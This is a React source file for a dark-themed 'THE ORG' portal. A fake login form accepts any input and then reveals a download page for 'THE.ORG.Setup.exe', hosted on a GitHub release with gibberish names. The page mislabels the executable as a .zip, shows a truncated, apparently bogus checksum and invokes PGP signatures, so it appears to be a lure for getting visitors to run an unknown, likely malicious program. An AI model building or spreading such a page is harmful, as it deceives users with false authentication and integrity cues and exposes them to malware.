import { useState } from "react";

const DOWNLOAD_URL = "https://github.com/distress3dd-lab/fsdfbsdfb/releases/download/efwef/THE.ORG.Setup.exe";

const GRID_COLOR = "rgba(100,180,255,0.08)";

function LoginPage({ onLogin }) {
  const [handle, setHandle] = useState("");
  const [key, setKey] = useState("");
  const [status, setStatus] = useState(null);

  function handleSubmit(e) {
    e.preventDefault();
    setStatus("authenticating");
    setTimeout(() => {
      setStatus(null);
      onLogin();
    }, 1600);
  }

  return (
    <div style={styles.panel}>
      <form onSubmit={handleSubmit} style={styles.form}>
        <label style={styles.label}>NODE HANDLE</label>
        <input
          style={styles.input}
          value={handle}
          onChange={e => setHandle(e.target.value)}
          placeholder="@handle"
          autoComplete="off"
          spellCheck={false}
        />

        <label style={styles.label}>SESSION KEY</label>
        <input
          style={styles.input}
          type="password"
          value={key}
          onChange={e => setKey(e.target.value)}
          placeholder="••••••••••••••••"
        />

        <p style={styles.hint}>
          You must be connected via an encrypted P2P application before
          attempting authentication. Connections originating from standard
          browsers are logged and dropped.
        </p>

        <button type="submit" style={styles.submit} disabled={status === "authenticating"}>
          {status === "authenticating" ? "AUTHENTICATING…" : "REQUEST ACCESS"}
        </button>
      </form>
    </div>
  );
}

function DownloadPage() {
  return (
    <div style={styles.panel}>
      <div style={styles.downloadSection}>
        <p style={styles.dlIntro}>
          The Org client handles end-to-end encryption, peer discovery, and
          session routing. No central servers. No logs.
        </p>

        <div style={styles.dlList}>
          <div style={styles.dlRow}>
            <div style={styles.dlLeft}>
              <span style={styles.dlLabel}>Windows 64-bit</span>
              <span style={styles.dlExt}>.zip</span>
            </div>
            <div style={styles.dlRight}>
              <span style={styles.dlHash}>SHA256: b71e…44fa</span>
              <a href={DOWNLOAD_URL} download style={styles.dlBtn}>↓</a>
            </div>
          </div>
        </div>

        <p style={styles.dlNote}>
          Verify checksums before running. PGP signatures available on the keyserver.
        </p>
      </div>
    </div>
  );
}

export default function TheOrg() {
  const [screen, setScreen] = useState("login");

  return (
    <div style={styles.root}>
      <div style={styles.scanlines} />
      <div style={styles.grid} />
      <div style={styles.orb} />

      <main style={styles.main}>
        <header style={styles.header}>
          <div style={styles.sigil}>◈</div>
          <h1 style={styles.title}>THE ORG</h1>
          <p style={styles.subtitle}>DISTRIBUTED NODE NETWORK · EST. UNKNOWN</p>
        </header>

        <div style={styles.banner}>
          <span style={styles.bannerIcon}>⚠</span>
          <span style={styles.bannerText}>
            ACCESS REQUIRES AN ENCRYPTED P2P APPLICATION.{" "}
            <span style={styles.bannerHighlight}>CLEARNET CLIENTS WILL BE REJECTED.</span>
          </span>
        </div>

        <div style={styles.tabBar}>
          <div style={{ ...styles.tab, ...(screen === "login" ? styles.tabActive : {}) }}>
            {screen === "login" ? "LOGIN" : "DOWNLOAD"}
          </div>
        </div>

        {screen === "login" ? (
          <LoginPage onLogin={() => setScreen("download")} />
        ) : (
          <DownloadPage />
        )}

        <footer style={styles.footer}>
          <span style={styles.footerLine}>◈ THE ORG · ALL SESSIONS EPHEMERAL · NO RECORD KEPT ◈</span>
        </footer>
      </main>
    </div>
  );
}

const styles = {
  root: {
    minHeight: "100vh",
    background: "#050d1a",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: "'Courier New', Courier, monospace",
    position: "relative",
    overflow: "hidden",
    color: "#a8d8ff",
  },
  scanlines: {
    position: "fixed",
    inset: 0,
    background:
      "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.18) 2px, rgba(0,0,0,0.18) 4px)",
    pointerEvents: "none",
    zIndex: 10,
  },
  grid: {
    position: "fixed",
    inset: 0,
    backgroundImage: `linear-gradient(${GRID_COLOR} 1px, transparent 1px), linear-gradient(90deg, ${GRID_COLOR} 1px, transparent 1px)`,
    backgroundSize: "40px 40px",
    zIndex: 0,
  },
  orb: {
    position: "fixed",
    bottom: "-20vh",
    left: "50%",
    transform: "translateX(-50%)",
    width: "80vw",
    height: "50vh",
    background: "radial-gradient(ellipse at center, rgba(0,120,255,0.18) 0%, transparent 70%)",
    zIndex: 0,
    pointerEvents: "none",
  },
  main: {
    position: "relative",
    zIndex: 5,
    width: "100%",
    maxWidth: 520,
    padding: "0 20px 40px",
    boxSizing: "border-box",
  },
  header: {
    textAlign: "center",
    marginBottom: 28,
    paddingTop: 48,
  },
  sigil: {
    fontSize: 32,
    color: "#4db8ff",
    marginBottom: 8,
    display: "block",
    textShadow: "0 0 20px rgba(77,184,255,0.8)",
  },
  title: {
    margin: 0,
    fontSize: 36,
    fontWeight: 700,
    letterSpacing: "0.35em",
    color: "#e0f4ff",
    textShadow: "0 0 30px rgba(77,184,255,0.5)",
  },
  subtitle: {
    margin: "8px 0 0",
    fontSize: 10,
    letterSpacing: "0.22em",
    color: "#4d8aaa",
  },
  banner: {
    border: "1px solid rgba(255,190,60,0.3)",
    background: "rgba(255,190,60,0.05)",
    padding: "10px 14px",
    marginBottom: 20,
    display: "flex",
    alignItems: "flex-start",
    gap: 10,
    fontSize: 11,
    letterSpacing: "0.05em",
    color: "#c8a850",
    lineHeight: 1.5,
  },
  bannerIcon: { flexShrink: 0, fontSize: 13, marginTop: 1 },
  bannerText: { flex: 1 },
  bannerHighlight: { color: "#f0c060" },
  tabBar: {
    display: "flex",
    borderBottom: "1px solid rgba(77,184,255,0.2)",
    marginBottom: 0,
  },
  tab: {
    padding: "10px 20px",
    fontSize: 11,
    letterSpacing: "0.18em",
    color: "#4d7a99",
    marginBottom: -1,
  },
  tabActive: {
    color: "#4db8ff",
    borderBottom: "2px solid #4db8ff",
  },
  panel: {
    border: "1px solid rgba(77,184,255,0.15)",
    borderTop: "none",
    background: "rgba(5,20,40,0.7)",
    padding: 28,
  },
  form: { display: "flex", flexDirection: "column", gap: 6 },
  label: {
    fontSize: 10,
    letterSpacing: "0.2em",
    color: "#4d8aaa",
    marginTop: 10,
    marginBottom: 2,
  },
  input: {
    background: "rgba(0,40,80,0.5)",
    border: "1px solid rgba(77,184,255,0.25)",
    color: "#c8e8ff",
    padding: "10px 12px",
    fontSize: 13,
    fontFamily: "inherit",
    outline: "none",
    letterSpacing: "0.04em",
    width: "100%",
    boxSizing: "border-box",
  },
  hint: {
    fontSize: 11,
    color: "#3d6a88",
    lineHeight: 1.6,
    margin: "14px 0 6px",
    borderLeft: "2px solid rgba(77,184,255,0.2)",
    paddingLeft: 10,
  },
  submit: {
    marginTop: 10,
    background: "linear-gradient(135deg, rgba(0,80,160,0.6), rgba(0,40,100,0.6))",
    border: "1px solid rgba(77,184,255,0.4)",
    color: "#a8d8ff",
    padding: "12px 0",
    fontSize: 11,
    letterSpacing: "0.22em",
    cursor: "pointer",
    fontFamily: "inherit",
    width: "100%",
  },
  downloadSection: { display: "flex", flexDirection: "column", gap: 18 },
  dlIntro: { fontSize: 12, color: "#5a9aba", lineHeight: 1.7, margin: 0 },
  dlList: { display: "flex", flexDirection: "column" },
  dlRow: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    borderBottom: "1px solid rgba(77,184,255,0.1)",
    padding: "12px 0",
    gap: 12,
  },
  dlLeft: { display: "flex", alignItems: "baseline", gap: 8 },
  dlLabel: { fontSize: 12, color: "#a8d8ff", letterSpacing: "0.05em" },
  dlExt: { fontSize: 10, color: "#3d6a88" },
  dlRight: { display: "flex", alignItems: "center", gap: 14 },
  dlHash: { fontSize: 10, color: "#2d5570", letterSpacing: "0.04em" },
  dlBtn: {
    background: "rgba(0,60,120,0.4)",
    border: "1px solid rgba(77,184,255,0.3)",
    color: "#4db8ff",
    width: 30,
    height: 30,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    cursor: "pointer",
    fontSize: 14,
    fontFamily: "inherit",
    textDecoration: "none",
    lineHeight: "30px",
    textAlign: "center",
  },
  dlNote: { fontSize: 10, color: "#2d5570", letterSpacing: "0.08em", margin: 0 },
  footer: { marginTop: 24, textAlign: "center" },
  footerLine: { fontSize: 9, letterSpacing: "0.18em", color: "#1d3d55" },
};
